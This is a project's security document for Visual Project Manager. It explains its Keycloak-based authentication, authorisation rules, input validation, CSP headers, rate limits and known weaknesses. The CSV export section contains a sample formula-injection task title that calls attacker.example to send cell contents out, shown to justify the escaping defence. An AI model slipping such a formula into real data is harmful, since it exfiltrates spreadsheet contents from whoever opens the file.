# Security

This document describes how Visual Project Manager handles identity,
authorisation and untrusted input, and at the end what it does not handle.
The second list matters more than the first. A security document that only
lists strengths is a marketing page.

**Status:** this began as a classroom brief and was rebuilt on a different
stack. It has never held anybody's real data. Where a public instance is
running it is a demonstration: it holds the seeded plan and nothing else,
its sign-in credentials are printed in the README on purpose, and a
nightly job restores both the plan and the realm settings. Several
decisions below are correct for that setting and would need revisiting
before this held data belonging to anyone; each one says so where it
applies.

---

## Reporting something

If you find a vulnerability, open a
[GitHub issue](https://github.com/ghiacciolodev/Visual-Project-Manager/issues)
describing it. There is no embargo process and nothing to coordinate: any
instance you can reach holds seeded demonstration data and no account
belonging to anyone, so there is nobody to warn first.

---

## The shape of it

Two systems, and the split between them is the main design decision.

**Keycloak establishes who you are.** It owns passwords, registration,
password reset, brute-force lockout and the tokens. The application never
sees a password, has no login form of its own, and has no code that could
leak one.

**The application decides what you may do.** Project membership and roles
live in its own database, not in the token.

Putting roles in the token was the obvious alternative and it is worse
here. Membership changes far more often than identity does, and a token
carrying `role: OWNER` stays valid until it expires, so removing somebody
from a project would leave them able to administer it for up to fifteen
minutes. It also means every membership change forces a token refresh, and
scales the token with the number of projects a person belongs to.

```
Keycloak                          Application
────────                          ───────────
who you are          ─ token ─▶   which projects you are in
passwords                         what your role is in each one
sessions                          whether this action is allowed
lockout
```

---

## Authentication

**OpenID Connect, Authorization Code with PKCE.** The Angular client is a
public client with no secret, because a secret in a browser bundle is
readable by anyone who opens the developer tools. It is not a secret, it
is a string. PKCE replaces it with a per-request proof that only the tab
which started the flow can produce.

**The issuer is checked, not just the signature.** The backend addresses
Keycloak by two URLs: it fetches signing keys over the compose network
(`http://keycloak:8080`) and validates the `iss` claim against the public
address the browser used (`http://localhost:8081`). Validating against the
internal address would reject every real token; skipping the check
entirely would accept tokens minted by *any* realm on that server. See
`SecurityConfig.jwtDecoder`.

**A token with no `sub` claim is rejected outright.** Not defensive
padding: Spring Data turns a null parameter into `WHERE keycloak_sub IS
NULL`, which matches every not-yet-linked row. A token without a subject
would silently adopt somebody else's account, and the next one would adopt
it in turn. `CurrentUser.require()` throws instead.

**An invited account is claimed only on a verified address.** Somebody
invited by email before they have ever signed in gets a placeholder row,
and the first matching login adopts it: that is what turns an invitation
into a working account instead of a duplicate. The matching has to be on
`email_verified`, because registration is open. Without that condition the
sequence is short and complete: learn that an address has been invited as
an owner, register with it, sign in once, and the project is yours. The
realm sets `verifyEmail` as well, so the two agree rather than one relying
on the other.

**Access tokens last fifteen minutes** and are renewed silently in the
background from a refresh token. A rejected token sends the person back to
Keycloak rather than showing them an error they cannot act on.

**The Authorization header is attached by URL, not to everything.** The
interceptor adds it only to requests aimed at this application's own API.
An interceptor that added it unconditionally would also send the access
token to Keycloak's token endpoint and to any third-party service the app
later talked to.

---

## Authorisation

Every rule is enforced on the **service** layer, one step closer to the
data than the controller, so it still applies if a second controller, a
scheduled job or a test calls in.

```java
@PreAuthorize("@access.canEdit(#projectId)")
public TaskResponse update(Long projectId, Long id, TaskRequest request)
```

| Role     | Read the plan | Change the plan | Rename, delete, manage people |
|----------|:-------------:|:---------------:|:-----------------------------:|
| `OWNER`  | ✓             | ✓               | ✓                             |
| `EDITOR` | ✓             | ✓               | ✗                             |
| `VIEWER` | ✓             | ✗               | ✗                             |

Anyone may remove **themselves** from a project regardless of role; see
`ProjectAccess.canRemoveMember`. A project cannot be left without an
owner, which is refused for departures and demotions alike.

### 404 for strangers, 403 for members

A non-member asking for project 7 gets `404 Not Found`, not `403
Forbidden`. A 403 confirms that project 7 exists, and an id that answers
differently for members and strangers is an enumeration oracle: walk the
integers and you learn how many projects the system holds and which ids
are live.

A **member** who lacks the role for an action does get a 403, with the
reason. They already know the project exists, and hiding why the button
did nothing would only leave them guessing.

### Insecure direct object references

Every task lookup is by id **and** project:

```java
repository.findByIdAndProjectIdAndDeletedAtIsNull(id, projectId)
```

A task id guessed from another project does not resolve, and the caller
learns nothing about whether it exists elsewhere. The same pairing means a
dependency edge can never be made to reach across into another plan.

Assignment is checked the same way. `assignee_id` accepts only a user who
is a member of that project. Otherwise the column would be a way to attach
a stranger's account to your plan, and their name would then be read back
out of the task list by everybody in it. The schema cannot express that
rule: its foreign key says "some user", and what is needed is "a member of
this project".

---

## Input

**Bean Validation on the DTO, CHECK constraints in the schema.** Both, on
purpose: the annotations turn bad input into a readable 400, and the
constraints are the line nobody can bypass, not by an application bug, not
by a manual `INSERT`, not by a future second writer.

**Colour is matched against `^#[0-9A-Fa-f]{6}$`** before it is stored. That
value ends up in an inline `style` attribute on the Gantt bars, so it is
the one field where unvalidated input would reach a rendering context
directly.

**Mass assignment is prevented by the shape of the DTO.** `TaskRequest`
has no `id`, no `projectId` and no timestamps. There is no binder to
configure and no field to forget to exclude, because the fields do not
exist.

**Angular escapes interpolated values by default,** and this application
never uses `bypassSecurityTrustHtml` or `innerHTML`.

**A write must name the version it was built from.** `expectedVersion` is
required on update, so there is no unconditional write and no way to get
last-write-wins by leaving a field out. It was optional once, which made
the protection a convention. `@Version` puts the same number in the
`UPDATE`'s `WHERE` clause, so the database refuses a stale write even if
the service layer is changed to stop checking.

**Adding a dependency takes the project's lock first.** The cycle check is
check-then-act: ask whether an edge closes a loop, then insert it. Two
requests adding opposite edges at the same moment both pass a check made
against a graph neither has changed, and the result is a cycle that leaves
the plan with no topological order and the critical path answering 409 on
every read. A transaction-scoped advisory lock, keyed by project,
serialises just that.

---

## Output

Errors are RFC 9457 Problem Details, in one shape across the whole API,
including the 429 that a servlet filter writes by hand because a filter
never reaches the exception handler.

Stack traces, exception messages and SQL fragments do not reach clients:

```yaml
server.error.include-stacktrace: never
server.error.include-message: never
```

Actuator exposes `health` and nothing else. The other endpoints publish
configuration, beans and environment variables.

### The exports, and formula injection

The CSV export is an output path with a genuine injection surface, and it
is worth being explicit about because it does not look like one.

A cell whose text begins with `=`, `+`, `-` or `@` is a **formula** to
Excel, Google Sheets and LibreOffice alike. So a task titled

```
=HYPERLINK("https://attacker.example/?d="&A1&A2,"Click for the report")
```

is inert everywhere in this application, where Angular escapes it and the
schedule shows it as text. It becomes executable the moment somebody
exports the plan and opens the file. The route runs from data one project
member can type to a spreadsheet another member opens on their own
machine, which is the part that makes it worth defending rather than
shrugging at.

`escapeCell` in `core/export.ts` prefixes any such value with an
apostrophe, the mitigation those three applications all understand as "the
rest is text". Numbers never pass through it, so a negative figure stays a
number. RFC 4180 quoting is applied on top and separately: quoting alone
is *not* a defence, because a spreadsheet strips the CSV quoting before it
decides what the cell means.

The iCal export has no equivalent hazard, because no calendar client
evaluates the text of an event. Its escaping is about parse integrity
rather than execution: an unescaped newline or semicolon ends a property
early and the remainder is read as a content line of its own, which turns
a task description into a malformed import.

Both files are written in the browser from data the caller already has, so
neither adds new access; the concern is entirely about what happens to
them after they are saved. `export.spec.ts` pins all four spreadsheet
prefixes.

---

## Response headers

Two servers answer requests here and they need different things.

**The API** takes Spring Security's defaults, which are right: `nosniff`,
`X-Frame-Options: DENY`, and `Cache-Control: no-store` on everything.
`X-XSS-Protection` is deliberately `0`, because the legacy auditor it
enabled introduced vulnerabilities of its own.

**The application** is static files behind nginx, and until recently sent
nothing at all. It is the half that renders HTML and holds the tokens, so
it is the half where headers matter most. `frontend/security-headers.conf`
now carries them, and the policy is:

```
default-src 'self';
script-src  'self';
style-src   'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src    'self' https://fonts.gstatic.com;
img-src     'self' data:;
connect-src 'self' http://localhost:8080 http://localhost:8081;
frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
```

plus `nosniff`, `X-Frame-Options: DENY`,
`Referrer-Policy: strict-origin-when-cross-origin`, a `Permissions-Policy`
that denies every device this application does not use, and
`server_tokens off`.

`script-src 'self'` is the one worth having, and it is the one that took
work. Angular's critical-CSS inliner shipped the stylesheet as
`<link media="print" onload="this.media='all'">` with the plain link only
inside `<noscript>`, which makes an inline event handler the only path by
which a scripted browser receives any CSS. A strict `script-src` blocks it
and the application renders unstyled.
`optimization.styles.inlineCritical: false` in `angular.json` is what
makes the directive possible, and it is there for that reason alone.

`style-src` keeps `'unsafe-inline'`. Angular injects component styles as
`<style>` elements at runtime, so without a nonce they are inline styles,
and a nonce would have to be minted per response and substituted into both
the header and an `ngCspNonce` attribute. A server handing out static
files is the wrong shape for that, and it would mean `index.html` could
never be cached. The trade is deliberate rather than overlooked:
CSS injection leaks a little through selectors, script injection does
anything at all, and the strictness is spent where it buys the most. The
chart's `[style.background]` bindings need no exception either way, since
Angular writes those through the CSSOM, which `style-src` does not govern.

`connect-src` names the API and Keycloak, and is substituted at container
start from the same two environment variables that produce `config.json`.
That is deliberate rather than convenient: a policy and an application
that disagree about where the API lives fail in the least useful way
available, with every request blocked, nothing in the server log, and the
reason only in the browser console. Deriving both from one value removes
the possibility rather than documenting it.

All three used to be written by hand, and all three said localhost, so
the image was correct on the machine that built it and nowhere else.

One nginx detail, because it is the sort that fails silently: `add_header`
inside a `location` **replaces** the inherited set rather than extending
it. The `add_header Cache-Control` on hashed assets would therefore have
stripped every security header from precisely the scripts and stylesheets
that most need `nosniff`. The headers are a separate file included from
both locations, and deliberately not in `conf.d/`, which nginx globs into
the `http` block and which would have sent every header three times.

Verified against the built image: the headers arrive once each, assets
carry them alongside the cache header, and the application renders with
its own typography and colours and no console violation.

---

## CSRF, CORS, rate limiting

**CSRF protection is off, deliberately.** The attack needs a credential
the browser attaches *automatically*, which means a cookie. This API
authenticates with a `Bearer` header that a cross-site form cannot set, so
there is nothing to forge. **If the client ever moves to cookie-based
sessions, this must come back on**, and the comment in `SecurityConfig`
says so at the point where it would be changed.

**CORS allows exactly one origin,** from configuration, defaulting to the
development frontend. Not a wildcard, and not reflected from the `Origin`
header.

**Writes are rate limited; reads are not.** A token bucket per caller, 120
writes a minute, refilling continuously. Reads cost a query and are what a
person does by having the page open, and a limit low enough to stop
abusive reading would interrupt somebody switching between the schedule
and the chart. Writes are what grow the database and set dependency and
critical-path recalculation going.

Buckets are keyed by the token's **subject**, not by IP, so an office
behind one NAT address does not share a single allowance. Refill is greedy
rather than by interval: an interval refill lets a caller drain the bucket,
wait for the boundary and drain it again, which is twice the intended rate.

**There are ceilings as well as a rate,** because the two answer different
questions and only one of them was being asked. 120 writes a minute is a
limit on how fast; the answer to how much was "for ever". One account at
that rate adds roughly a hundred and seventy thousand rows a day and never
stops, and with open registration that account costs an email address.
Separately harmless, together a way to fill a disk.

So: 2000 tasks per project, 100 members per project, 100 projects per
person, all configuration and all set far above anything honest. Two
details are load-bearing. Membership is counted rather than ownership,
because counting what somebody created is walked around by making a
project, handing it over and making another. And the members ceiling is
checked *before* the user lookup, so a refused invitation is not a way of
writing rows into the users table for arbitrary addresses.

The task ceiling counts live rows only. Counting soft-deleted ones would
mean a project that reached the limit could never get back under it, and
deleting a task is the only remedy the interface offers.

**Password brute force is Keycloak's job:** five failures, temporary
lockout, up to fifteen minutes, no permanent lockout (which is itself a
denial-of-service vector against a known username).

**The direct access grant is off.** `directAccessGrantsEnabled: false` on
`vpm-frontend`, so username and password cannot be exchanged for a token
directly; the only way in is the browser flow with PKCE. This is worth
stating because the running instance and the committed realm had drifted
apart on exactly this point, and the file is the one anybody reads.
Re-importing the realm is what makes them agree, and there is no
mechanism here that keeps them agreeing.

**Refresh tokens rotate.** `revokeRefreshToken` with
`refreshTokenMaxReuse` at 0, so each refresh mints a new token and spends
the old one, and presenting a spent one revokes the session. The weakness
list below explains what that is worth and what it is not.

---

## Secrets

There are none in this repository.

`.env` and `.env.example` hold development values for containers listening
on localhost: `vpm_local_dev`, `admin`. They protect nothing that is
reachable from anywhere else, and the file says so. Real deployments would
take these from the platform's environment and from GitHub Secrets.

The Angular client has no secret to leak, by design (see PKCE above).

---

## Known weaknesses

These are real and unfixed. Several are the consequence of decisions taken
deliberately; all of them would need addressing before this held data that
mattered.

**1. Tokens live in `sessionStorage`, so script running on this origin can
read them.** They are cleared when the tab closes and are not shared
between tabs, which is why `sessionStorage` and not `localStorage`.

The mitigation usually named for this, an `httpOnly` cookie, does not
change the outcome. Script on the origin does not need to read a cookie,
because the browser attaches it to the requests that script makes. Under
either arrangement, script on the origin has the signed-in caller's
authority.

What the storage does decide is portability. A token in `sessionStorage`
is a string that can be copied elsewhere and replayed from anywhere; a
token in an `httpOnly` cookie can only be used from the browser holding
it. That is a real difference and a smaller one than it is usually given
credit for.

Three settings bound how long a copied token stays useful:

- the access token expires after 900 seconds;
- the refresh token is bound to the Keycloak session rather than being an
  offline token, so it ends when the session does. This is why the OIDC
  library warns at startup about the missing `offline_access` scope;
  adding that scope would issue a token which outlives sign-out, so the
  warning stays;
- `ssoSessionIdleTimeout` is 1800 seconds, so a refresh token stops
  working half an hour after the session goes quiet.

A fourth setting bounds it, and this one is aimed at portability rather
than at time. `revokeRefreshToken` is on with `refreshTokenMaxReuse` at 0,
so a refresh token is invalidated at its first use and the whole chain is
revoked if it is presented twice. A copied token replayed from elsewhere
therefore collides with the client it was copied from: whichever refreshes
second presents a spent one, and the session ends. It does not stop script
on this origin, which can refresh in place and keep the new pair. What it
stops is a token walking out of the browser and staying useful.

Rotation needs the client to hold exactly one refresh in flight, since
with no reuse allowed a second concurrent attempt would revoke a live
session. That is the library's job here rather than this application's:
`PeriodicallyTokenCheckService` refuses to start a renew while one is
running, sets the flag before the request and clears it afterwards, with a
timeout for a process that dies mid-flight. The interceptor never
refreshes at all; a 401 sends the person back to Keycloak. And
`sessionStorage` is per tab, so two tabs hold two independent chains
rather than competing over one.

One thing is not in place. The structural alternative, a
backend-for-frontend holding the refresh token in an `httpOnly` cookie, is
not here; it would also bring CSRF protection back into scope. That is a
decision rather than an oversight, and `runtime-config.ts` says so at the
point where the storage is configured.

**2. Rate-limit buckets are in memory, per instance.** Two instances
behind a load balancer mean two allowances. A restart forgives everybody.
Acceptable for a burst limit; it would not be for a quota. A shared store
(Redis, or Bucket4j's JDBC backend) is the fix.

**3. The development stack is not hardened, and is not meant to be.**
`start-dev` disables the HTTPS requirement, the bootstrap administrator is
`admin`/`admin` from `docker-compose.yml`, registration is open, and five
ports are published on the host. Every one of those is right for a laptop
and wrong on the internet.

They are not left to be remembered. `docker-compose.prod.yml` overlays the
lot: `start` instead of `start-dev`, `sslRequired` at `external`, no
published port but Caddy's, every secret required with no default so the
stack refuses to come up rather than come up weak, and registration and
password reset switched off because the four demo accounts are the way in
and Mailpit is not reachable. The realm changes are applied by the seed
script rather than baked into `realm-export.json`, so the committed realm
stays the one a developer wants. [The deployment notes](docs/deploying.md)
set out the whole difference in a table.

What that leaves is a public instance whose sign-in credentials are
printed in a README, on purpose. It survives because those accounts can
reach nothing but their own demo project, because the creation ceilings
bound what anybody can add, and because a nightly timer puts the plan back
and re-asserts the realm settings. Configuration applied once drifts.

**4. Inviting somebody tells you whether their address has an account.**
`POST /projects/{id}/members` answers with `signedUp` and, for an address
that already exists, that person's real display name rather than the email
that was submitted. So anybody who can create a project, which with open
registration is anybody at all, can test an arbitrary address and learn
both whether it is registered here and who it belongs to.

It is not patched, and the reason is worth stating rather than papering
over with a changed response body. The disclosure is inherent to
invitation without consent: the member list shows the same name a moment
later, so hiding it in the one response would be theatre. The real fix is
an invitation the invitee accepts, with the membership pending and the
identity unrevealed until they do, and that is a feature rather than a
patch. Slack, Notion and Linear all behave the way this does, which
explains the choice without excusing it. The ceilings above bound how far
the enumeration scales; they do not close it.

What used to sit on the end of this was worse than disclosure, and is
fixed. Provisioning claims a placeholder row by email, so an invitation
was inheritable by whoever presented the address; with registration open,
that meant reading who had been invited and then registering as them. It
now claims a row only on a **verified** address, and the realm sets
`verifyEmail`. An unverified token meeting a placeholder is refused rather
than being given a second row, because the address is unique and the
alternative was a 500 with no explanation. `PlaceholderClaimIT` pins all
three paths.

**5. The demo seed writes directly to the database.** `scripts/demo/`
takes the Keycloak bootstrap admin and a database container name and
bypasses the API entirely. That is the only way to seed a history with
dates in the past, and also why it must never be pointed at anything real.

**6. The audit log is append-only by convention, not by grant.** Nothing
in the application deletes or updates a row in `audit_log`, and no
endpoint exposes a way to. But the application's database user is the
owner of the table and could. A real tamper-evident log needs either a
restricted grant or somewhere the application cannot write at all.

**7. Soft-deleted tasks are kept forever.** `deleted_at` is set and the row
stays, deliberately: it is what keeps dependency references and history
readable. There is no retention policy, and under GDPR "we keep it
indefinitely because it was convenient" is not one of the lawful bases.

**8. Four advisories in the dependency tree**, two moderate and two high
as of the last `npm audit`. All four (`undici`, `hono`, `fast-uri`) arrive
through `@angular/build` and `@angular/cli`, which are `devDependencies`:
they are part of the build toolchain and none of them reaches the shipped
bundle. They are worth tracking and are not worth forcing a resolution
over, which would pin transitive versions the Angular CLI has not tested
against.

---

## What is deliberately not here

No secrets scanning, no SAST in CI, no dependency auto-update bot, no
signed commits, no SBOM. All four are reasonable things to add and none of
them was going to teach me anything about this application that reading it
would not. They are the first things I would add if it were going to be
deployed.
